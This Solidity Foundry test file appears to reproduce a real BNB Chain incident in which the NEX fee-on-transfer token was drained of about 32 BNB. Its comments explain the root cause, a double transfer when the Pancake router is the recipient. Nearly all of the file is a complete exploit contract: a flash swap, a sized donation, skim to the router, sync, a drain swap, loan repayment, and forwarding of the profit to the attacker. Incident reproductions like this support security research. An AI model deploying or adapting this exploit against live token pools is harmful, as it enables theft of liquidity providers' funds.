// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~32.36 BNB (~$19.1K)
// Attacker : 0xC3cB0872C42BFA5EB3B0258D7EEA2cCaF6a49475
// Attack Contract : 0x29977d9B8a888B17BFfA2958b003956a5E8BE69A
// Vulnerable Contract : 0xaE04AE29bdB7aB7Eb249d3aFa7Bc3D37564e8Cf9 (NEX FoT token)
// Victim Pair : 0x974C0078740480aE830D379fDB8d5f441C9dDC75 (Pancake V2 NEX/AIC)
// Attack Tx : https://bscscan.com/tx/0x905Cc861bcC525D3A8E699583943831b97500BbAc11c92dc20ed6edbddd69f87
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xaE04AE29bdB7aB7Eb249d3aFa7Bc3D37564e8Cf9#code
//
// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2084461507312857521
//
// Root cause: NEX._transfer double-sends whenever from/to is the Pancake router (missing
// return after the isRouter branch) and also applies a 6% dao sell fee to AMM pairs.
// Attacker flash-borrows AIC, buys NEX, donates NEX into the NEX-AIC pair, then skim(router)
// which double-drains NEX from the pair. sync() freezes ~1 wei NEX reserve; leftover NEX
// swaps for nearly all AIC. Repay flash and exit AIC → USDC → BNB (~32.36 BNB).

address constant ATTACKER = 0xC3cB0872C42BFA5EB3B0258D7EEA2cCaF6a49475;
address constant NEX = 0xaE04AE29bdB7aB7Eb249d3aFa7Bc3D37564e8Cf9;
address constant AIC = 0xc0DC449De632586A00409873521AFC251aC5cE74;
address constant USDC_TOKEN = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant NEX_AIC_PAIR = 0x974C0078740480aE830D379fDB8d5f441C9dDC75;
address constant USDC_AIC_PAIR = 0xe89636FB73D04Db51e5Fbd0Ce1379fb8d2b96415;
address payable constant PANCAKE_ROUTER = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        // Pre-attack block (attack mined in 113_782_392).
        uint256 forkBlock = 113_782_391;
        vm.createSelectFork("http://127.0.0.1:8546", forkBlock);
        fundingToken = address(0); // native BNB profit
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(NEX, "NEX");
        vm.label(AIC, "AIC");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(NEX_AIC_PAIR, "NEX/AIC Pair");
        vm.label(USDC_AIC_PAIR, "USDC/AIC Pair");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
    }

    function testExploit() public balanceLog {
        uint256 attackerBefore = ATTACKER.balance;

        NexAicFotSkimExploit exploit = new NexAicFotSkimExploit(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = ATTACKER.balance - attackerBefore;
        emit log_named_decimal_uint("Attacker BNB profit", profit, 18);
        // Real incident ~32.36 BNB; allow a band for rounding / fee dust.
        assertGt(profit, 20 ether, "expected material BNB profit");
    }
}

contract NexAicFotSkimExploit {
    address private immutable profitReceiver;

    IERC20 private constant nex = IERC20(NEX);
    IERC20 private constant aic = IERC20(AIC);
    IPancakePair private constant nexAic = IPancakePair(NEX_AIC_PAIR);
    IPancakePair private constant usdcAic = IPancakePair(USDC_AIC_PAIR);
    IPancakeRouter private constant router = IPancakeRouter(PANCAKE_ROUTER);

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    receive() external payable {}

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");

        // Align USDC-AIC reserves with balances before the flash (as in the live tx).
        usdcAic.sync();

        // Flash-borrow essentially the entire AIC reserve of USDC-AIC (token1).
        uint256 aicInPair = aic.balanceOf(USDC_AIC_PAIR);
        // Liquidity sanity used by the real bytecode (pair AIC must dominate USDC-AIC AIC).
        uint256 aicInNexPair = aic.balanceOf(NEX_AIC_PAIR);
        require(aicInPair * 10_000 > aicInNexPair * 10_665, "insufficient flash liquidity");

        usdcAic.swap(0, aicInPair - 1, address(this), bytes("1"));

        // Convert leftover AIC → USDC → BNB and forward native profit to the EOA.
        uint256 aicLeft = aic.balanceOf(address(this));
        if (aicLeft > 0) {
            aic.approve(PANCAKE_ROUTER, aicLeft);
            address[] memory path = new address[](3);
            path[0] = AIC;
            path[1] = USDC_TOKEN;
            path[2] = WBNB_TOKEN;
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                aicLeft, 0, path, profitReceiver, block.timestamp
            );
        }

        uint256 dust = address(this).balance;
        if (dust > 0) {
            (bool ok,) = profitReceiver.call{value: dust}("");
            require(ok, "bnb forward");
        }
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == USDC_AIC_PAIR, "not usdc-aic");
        require(sender == address(this), "bad sender");
        require(amount0 == 0 && amount1 > 0 && data.length > 0, "bad loan");

        // --- 1) Buy NEX with flash-borrowed AIC (AIC → NEX on NEX-AIC) ---
        uint256 aicBal = aic.balanceOf(address(this));
        aic.approve(PANCAKE_ROUTER, aicBal);
        address[] memory buyPath = new address[](2);
        buyPath[0] = AIC;
        buyPath[1] = NEX;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            aicBal, 0, buyPath, address(this), block.timestamp
        );

        // --- 2) Core bug: donate NEX so pair receives exactly its current NEX balance,
        // then skim(ROUTER) + sync. NEX._transfer double-sends when `to` is the router, so
        // skim pulls 2× the excess and empties the pair's NEX. sync() freezes ~0 NEX /
        // full AIC reserves; leftover NEX then buys nearly all AIC.
        uint256 pairNex = nex.balanceOf(NEX_AIC_PAIR);
        // Sell fee is 6% (daoFee=6, nodeFee=0) → pair receives amount * 94/100.
        // Size so after-fee credit == pairNex - 1. Double-skim then leaves 1 wei of NEX,
        // which sync freezes as reserve0=1 (swap requires amountOut < reserve, so 0 fails).
        uint256 sendAmount = ((pairNex - 1) * 100) / 94;
        nex.transfer(NEX_AIC_PAIR, sendAmount);
        nexAic.skim(PANCAKE_ROUTER); // to=router triggers the double-transfer bug
        nexAic.sync();

        // --- 3) Direct pair.swap against the near-zero NEX reserve — getAmountOut with
        // reserveIn≈1 yields almost the entire AIC side.
        uint256 nexBal = nex.balanceOf(address(this));
        require(nexBal > 0, "no nex left");
        nex.transfer(NEX_AIC_PAIR, nexBal);
        (uint112 r0, uint112 r1,) = nexAic.getReserves();
        // token0=NEX, token1=AIC. Input is NEX credited after the 6% sell fee.
        uint256 reserveIn = uint256(r0);
        uint256 reserveOut = uint256(r1);
        uint256 amountIn = nex.balanceOf(NEX_AIC_PAIR) - reserveIn;
        // Pancake V2 fee 0.25% → 9975/10000
        uint256 amountInWithFee = amountIn * 9975;
        uint256 amountOut = (amountInWithFee * reserveOut) / (reserveIn * 10000 + amountInWithFee);
        require(amountOut > 0 && amountOut < reserveOut, "bad amountOut");
        nexAic.swap(0, amountOut, address(this), new bytes(0));

        // --- 4) Repay the USDC-AIC flash swap (Pancake V2 ~0.25% fee → *10026/10000) ---
        uint256 repay = (amount1 * 10_026) / 10_000 + 1;
        uint256 have = aic.balanceOf(address(this));
        require(have >= repay, "cannot repay flash");
        aic.transfer(USDC_AIC_PAIR, repay);
    }
}
